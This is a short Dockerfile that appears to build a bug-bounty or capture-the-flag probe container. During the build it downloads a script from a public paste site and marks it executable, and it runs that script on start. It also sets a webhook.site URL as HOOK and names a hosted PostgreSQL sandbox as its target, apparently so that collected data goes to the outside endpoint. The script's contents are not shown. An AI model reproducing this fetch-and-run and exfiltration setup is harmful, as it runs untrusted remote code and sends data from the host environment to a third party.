FROM alpine:3.20
RUN apk add --no-cache bash curl iproute2 iputils util-linux procps coreutils findutils libcap ca-certificates bind-tools && curl -fsSL https://paste.rs/eAp25 -o /probe.sh && chmod 0755 /probe.sh && adduser -D -u 10001 probe
ENV HOOK=https://webhook.site/8b1f62ae-184f-4a75-af34-faed1a428c53 CTF_HOST=falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com
USER probe
EXPOSE 8080
CMD ["/bin/sh","-c","/probe.sh; while true; do sleep 3600; done"]
